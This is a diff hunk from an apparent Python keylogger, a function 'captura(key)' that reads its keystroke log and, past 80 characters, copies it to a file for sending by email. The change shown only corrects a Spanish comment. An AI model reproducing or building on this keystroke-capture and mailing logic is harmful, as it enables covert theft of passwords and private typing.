@@ -29,7 +29,7 @@ def captura(key):
     file = open("log", "r")
     data=file.read()
     file.close()
-    # Si el archivo tiene mas 80 caracteres envia el correo.
+    # Si el archivo tiene más de 80 caracteres envia el correo.
     if len(data)>80:
         # Crea un segundo archivo para enviar y no interrumpir el guardado del primero.
         fil=open("send","a")
